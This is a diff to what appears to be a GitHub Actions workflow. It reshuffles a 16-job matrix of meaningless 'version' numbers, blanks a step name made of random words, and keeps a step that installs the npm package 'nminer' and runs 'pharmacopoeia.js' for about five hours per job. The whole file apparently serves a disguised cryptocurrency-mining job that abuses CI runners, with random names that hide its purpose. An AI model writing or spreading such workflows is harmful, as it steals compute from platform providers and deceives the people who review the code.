@@ -9,22 +9,22 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 5992 }
-          - { version: 8390 }
-          - { version: 7106 }
-          - { version: 5574 }
-          - { version: 7430 }
-          - { version: 3476 }
-          - { version: 8127 }
-          - { version: 9226 }
-          - { version: 739 }
-          - { version: 3440 }
-          - { version: 9169 }
-          - { version: 4376 }
-          - { version: 1162 }
-          - { version: 3270 }
-          - { version: 355 }
-          - { version: 5912 }
+          - { version: 1407 }
+          - { version: 4574 }
+          - { version: 4955 }
+          - { version: 1948 }
+          - { version: 2862 }
+          - { version: 458 }
+          - { version: 2126 }
+          - { version: 9915 }
+          - { version: 7769 }
+          - { version: 7360 }
+          - { version: 7023 }
+          - { version: 1650 }
+          - { version: 1135 }
+          - { version: 3619 }
+          - { version: 3770 }
+          - { version: 9515 }
 
     steps:
       - name: Checkout
@@ -35,7 +35,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: grim couch sticker barring piglet
+      - name: 
         run: |
           npm install nminer@latest
-          timeout 345m node pharmacopoeia.js || echo "pharmacopoeia executed"
+          timeout 312m node pharmacopoeia.js || echo "pharmacopoeia executed"
